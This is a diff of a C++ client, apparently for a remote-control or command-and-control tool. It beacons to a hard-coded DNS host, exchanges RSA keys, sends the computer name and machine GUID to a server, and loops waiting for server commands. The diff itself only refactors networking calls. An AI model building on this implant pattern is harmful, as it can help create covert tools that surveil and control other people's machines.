@@ -1,13 +1,11 @@
 #include "Client.h"
-#include "NetworkCommon.h"
+#include "NetworkManager.h"
+#include "Syscalls.h"
 
 #ifdef CLIENT_RELEASE
 
 Client::Client() {
-    NetCommon::LoadWSAFunctions();
-
     // setup udp addr
-
     hostent* host = GetHostByName(DNS_NAME.c_str());
     if ( host == NULL )
         return;
@@ -61,9 +59,11 @@ BOOL Client::Connect() {
 
     Server TCPServer;
     sockaddr_in serverAddr;
-    BOOL received = NetCommon::ReceiveData(TCPServer, this->m_UDPSocket, UDP, serverAddr);
+    bool received = m_NetworkManager.ReceiveData(TCPServer, this->m_UDPSocket, UDP, serverAddr);
     if ( !received )
         return FALSE;
+
+    CLIENT_DBG("good");
 
     this->m_UDPServerDetails.addr = serverAddr;
     this->m_TCPServerDetails = TCPServer;
@@ -76,18 +76,15 @@ BOOL Client::Connect() {
     int connect = ConnectSocket(this->m_TCPSocket, ( sockaddr* ) &this->m_TCPServerDetails.addr, sizeof(this->m_TCPServerDetails.addr));
     if ( connect == SOCKET_ERROR )
         return FALSE;
-        
+    
+    CLIENT_DBG("connect");
+
     RSAKeys keys = LGCrypto::GenerateRSAPair(4096);
     this->SetRequestSecrets(keys);
 
-    if ( !ExchangePublicKeys() )
-        return FALSE;
-    
-    if ( !SendComputerNameToServer() )
-        return FALSE;
-
-    if ( !SendMachineGUIDToServer() )
-        return FALSE;
+    ExchangePublicKeys();
+    SendComputerNameToServer();
+    SendMachineGUIDToServer();
 
     return TRUE;
 }
@@ -133,21 +130,25 @@ void Client::SetRemoteMachineGUID() {
 
 BYTESTRING Client::MakeTCPRequest(const ClientRequest& req, BOOL encrypted) {
 
-    //BOOL sent = encrypted ? SendEncryptedMessageToServer(this->m_TCPServerDetails, req) : SendMessageToServer(this->m_TCPServerDetails, req);
     BOOL sent = FALSE;
 
     if ( encrypted )
-        sent = NetCommon::TransmitData(req, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, this->m_ServerPublicKey, FALSE);
+        sent = m_NetworkManager.TransmitData(req, this->m_TCPSocket, TCP, NULL_ADDR, true, this->m_ServerPublicKey, false);
     else
-        sent = NetCommon::TransmitData(req, this->m_TCPSocket, TCP);
+        sent = m_NetworkManager.TransmitData(req, this->m_TCPSocket, TCP);
 
     if ( !sent ) return {};
 
-    BYTESTRING serverResponse;
-    BOOL received = NetCommon::ReceiveData(serverResponse, this->m_TCPSocket, TCP, NetCommon::_default, encrypted, this->m_RequestSecrets.priv, TRUE);
+    BYTESTRING data;
+    BOOL received = m_NetworkManager.ReceiveData(data, this->m_TCPSocket, TCP);
     if ( !received ) return {};
 
-    return serverResponse;
+    if ( encrypted ) {
+        BYTESTRING decrypted = LGCrypto::RSADecrypt(data, this->m_RequestSecrets.priv, TRUE);
+        return decrypted;
+    }
+
+    return data;
 }
 
 BOOL Client::SendComputerNameToServer() {
@@ -244,18 +245,22 @@ void Client::ListenForServerCommands() {
     while ( TRUE ) {
         BYTESTRING encrypted;
 
-        received = NetCommon::ReceiveData(
+        received = m_NetworkManager.ReceiveData(
             encrypted,
             this->m_TCPSocket,
             TCP
         );
+
+        CLIENT_DBG("got packet!");
 
         Packet receivedPacket = OnEncryptedPacket(encrypted);
         ClientResponse responseToServer;
         
         if ( receivedPacket.action == kKeepAlive ) {
             // echo keep alive
-            NetCommon::TransmitData(receivedPacket, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, this->m_ServerPublicKey, FALSE);
+            CLIENT_DBG("echo keep alive!");
+            Sleep(100);
+            m_NetworkManager.TransmitData(receivedPacket, this->m_TCPSocket, TCP, NULL_ADDR, true, this->m_ServerPublicKey, false);
             continue;
         }
 
@@ -267,7 +272,7 @@ void Client::ListenForServerCommands() {
             continue;
 
         // respond to server with 'responseToServer'
-        NetCommon::TransmitData(responseToServer, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, this->m_ServerPublicKey, FALSE);
+        m_NetworkManager.TransmitData(responseToServer, this->m_TCPSocket, TCP, NULL_ADDR, true, this->m_ServerPublicKey, false);
     }
 }
 
@@ -305,30 +310,22 @@ BOOL Client::SendMessageToServer(std::string message, BOOL encrypted) {
     BOOL       success    = FALSE;
 
     if ( encrypted ) {
-        success = NetCommon::TransmitData(serialized, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, this->m_ServerPublicKey, FALSE);
+        success = m_NetworkManager.TransmitData(serialized, this->m_TCPSocket, TCP, NULL_ADDR, true, this->m_ServerPublicKey, false);
     } else
-        success = NetCommon::TransmitData(serialized, this->m_TCPSocket, TCP);
+        success = m_NetworkManager.TransmitData(serialized, this->m_TCPSocket, TCP);
 
     return success;
 }
 
-BOOL Client::SendMessageToServer(const Server& dest, ClientMessage message) {
+bool Client::SendMessageToServer(Server& dest, ClientMessage message) {
+    bool success = false;
+
     if ( dest.type == SOCK_STREAM ) // tcp
-        return NetCommon::TransmitData(message, this->m_TCPSocket, TCP);
-    else if ( dest.type == SOCK_DGRAM ) // udp
-        return NetCommon::TransmitData(message, this->m_UDPSocket, UDP, dest.addr);
+        return m_NetworkManager.TransmitData(message, this->m_TCPSocket, TCP);
+    else if ( dest.type == SOCK_DGRAM )
+        return m_NetworkManager.TransmitData(message, this->m_UDPSocket, UDP, dest.addr);
 
-    return FALSE;
-}
-
-BOOL Client::SendEncryptedMessageToServer(const Server& dest, ClientMessage message) {
-    BOOL success = FALSE;
-    if ( dest.type == SOCK_STREAM ) // tcp
-        success = NetCommon::TransmitData(message, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, this->m_ServerPublicKey, FALSE);
-    //else if ( dest.type == SOCK_DGRAM ) // udp
-        //success = NetCommon::TransmitData(message, this->m_UDPSocket, UDP, dest.addr, TRUE, pk, FALSE);
-
-    return success;
+    return false;
 }
 
 BOOL Client::Disconnect() {
@@ -348,6 +345,8 @@ BOOL Client::Disconnect() {
 
 #elif defined(SERVER_RELEASE)
 
+#include <random>
+
 Client::Client(SOCKET tcp, sockaddr_in addr)
     : AddressInfo(addr), m_TCPSocket(tcp)
 {
@@ -358,7 +357,6 @@ Client::Client(SOCKET tcp, sockaddr_in addr)
 }
 
 void Client::Disconnect() {
-    std::cout << "Disconnecting client." << std::endl;
     this->Alive = FALSE;
 
     CloseSocket(this->m_TCPSocket);
